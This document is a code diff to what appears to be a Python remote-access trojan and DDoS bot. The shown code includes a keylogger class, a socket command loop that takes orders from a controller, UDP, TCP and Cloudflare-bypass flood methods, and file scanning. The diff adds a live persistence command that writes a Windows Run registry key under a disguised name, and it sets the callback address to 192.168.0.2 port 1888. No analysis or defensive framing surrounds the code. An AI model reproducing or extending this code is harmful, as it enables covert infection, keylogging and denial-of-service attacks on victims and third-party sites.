@@ -94,14 +94,6 @@ def backdoor():
 
 # if not backdoor(): os._exit(1)
 
-#region Persistence
-# try:
-#     persistence_registry_name = "WindowsUpdate"
-#     persistenceCMD = f"REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /V \"{persistence_registry_name}\" /t REG_SZ /F /D \"{sys.argv[0]}\""
-#     subprocess.call(persistenceCMD, shell=True)
-# except: pass
-#endregion
-
 #endregion
 
 #region Functions
@@ -684,7 +676,6 @@ def AttackCFSOC(until_datetime, target, req):
 
 #endregion
 #endregion
-
 
 #region Keylogger
 class Keylogger: 
@@ -1755,9 +1746,8 @@ EXCLUDE_DIRECTORY = (
 )
 
 
-ip      	= "IP_HERE" 	# IP_HERE
-port_    	= "PORT_HERE"			# PORT_HERE
-
+ip      	= "192.168.0.2" 	# IP_HERE
+port_    	= "1888"			# PORT_HERE
 
 
 blocked_process = []
@@ -1929,6 +1919,13 @@ class Client():
             self.sock.send(str.encode(f"Scan Complete! | Files Found: {url}"))
 
         except Exception as e: self.sock.send(str.encode(f"Error: {e}"))
+    
+    def persistance(self, registry_name):
+        try:
+            persistenceCMD = f"REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /V \"{registry_name}\" /t REG_SZ /F /D \"{sys.argv[0]}\""
+            subprocess.call(persistenceCMD, shell=True)
+            return True
+        except: return False
     #endregion
 
     def start(self):
@@ -1944,37 +1941,23 @@ class Client():
                     thread = data[3]
                     t = data[4]
 
+                    self.sock.send(str.encode("Attack Started!"))
+
                     if method == "udp":
                         threading.Thread(target=runsender, args=(target, por_t, t, thread)).start()
-                        self.sock.send(f"""
-Attack sent successfully
-
-
-    -------Attack Infomation-------
-    IP:             \t{data[1]}
-    Port:           \t{data[2]}
-    Attack Method:  \t{str(data[0]).lower()}
-    Attack Time:    \t{data[4]}s
-    Thread Amount:  \t{data[3]}
-""".encode("ascii"))
                     
                     elif method == "tcp":
                         threading.Thread(target=runflooder, args=(target, por_t, t, thread)).start()
-                        self.sock.send(f"""
-Attack sent successfully
 
+                except: pass
 
-    -------Attack Infomation-------
-    IP:             \t{data[1]}
-    Port:           \t{data[2]}
-    Attack Method:  \t{str(data[0]).lower()}
-    Attack Time:    \t{data[4]}s
-    Thread Amount:  \t{data[3]}
-""".encode("ascii"))
-                    
-                    else: self.sock.send(f"Invalid Attack Method {method}".encode("ascii"))
-
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))	
+            elif "persistance" in data:
+                try:
+                    data=data.replace("persistance ","").split()
+                    registry_name = data[0]
+                    if self.persistance(registry_name): self.sock.send(str.encode("Persistance Successful!"))
+                    else: self.sock.send(str.encode("Persistance Failed!"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
             elif "scanfiles" in data:
                 try:
@@ -1999,71 +1982,25 @@ Attack sent successfully
                     thread = data[2]
                     t = data[3]
 
+                    self.sock.send(str.encode("Attack Started!"))
 
                     if method == "cfb":
-                        self.sock.send(f"""
-Attack sent successfully
-
-
-    -------Attack Infomation-------
-    Target:         \t{data[1]}
-    Attack Method:  \t{str(data[0]).lower()}
-    Attack Time:    \t{data[3]}s
-    Thread Amount:  \t{data[2]}
-""".encode("ascii"))
-                        
                         LaunchCFB(target, thread, t)
                     
                     elif method == "pxcfb":
                         if get_proxies():
-                            self.sock.send(f"""
-Attack sent successfully
-
-
-    -------Attack Infomation-------
-    Target:         \t{data[1]}
-    Attack Method:  \t{str(data[0]).lower()}
-    Attack Time:    \t{data[3]}s
-    Thread Amount:  \t{data[2]}
-""".encode("ascii"))
                             LaunchPXCFB(target, thread, t, proxies)
-                        else: self.sock.send(f"Failed to get proxies".encode("ascii"))
                     
                     elif method == "cfreq":
                         if get_cookie(target):
-                            self.sock.send(f"""
-Attack sent successfully
-
-
-    -------Attack Infomation-------
-    Target:         \t{data[1]}
-    Attack Method:  \t{str(data[0]).lower()}
-    Attack Time:    \t{data[3]}s
-    Thread Amount:  \t{data[2]}
-""".encode("ascii"))
-                            
                             LaunchCFPRO(target, thread, t)
-                        else: self.sock.send(f"Failed to bypass cf".encode("ascii"))
                     
                     elif method == "cfsoc":
                         if get_cookie(target):
-                            self.sock.send(f"""
-Attack sent successfully
-
-
-    -------Attack Infomation-------
-    Target:         \t{data[1]}
-    Attack Method:  \t{str(data[0]).lower()}
-    Attack Time:    \t{data[3]}s
-    Thread Amount:  \t{data[2]}
-""".encode("ascii"))
-                            
                             LaunchCFSOC(target, thread, t)
-                        else: self.sock.send(f"Failed to bypass cf".encode("ascii"))
-                    
-                    else: self.sock.send(f"Invalid Attack Method: {method}".encode("ascii"))
-                    
-                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+
+                except: pass
 
             elif "root" in data:
                 try:
@@ -2193,9 +2130,6 @@ Attack sent successfully
                     self.sock.send(f"Process Control Disabled".encode("ascii"))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
-            elif data == "ping":
-                self.sock.send(str.encode(f"pong"))
-
             elif data == "systeminfo":
                 try:
                     data = f""" System Information
@@ -2274,6 +2208,9 @@ Attack sent successfully
                     cursor_jiggle.stop = 420
                     self.sock.send(str.encode("Jiggling Cursor Disabled"))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif data == "ping":
+                self.sock.send(str.encode(f"pong"))
 
             else: self.sock.send(str.encode("Invalid Command"))
 
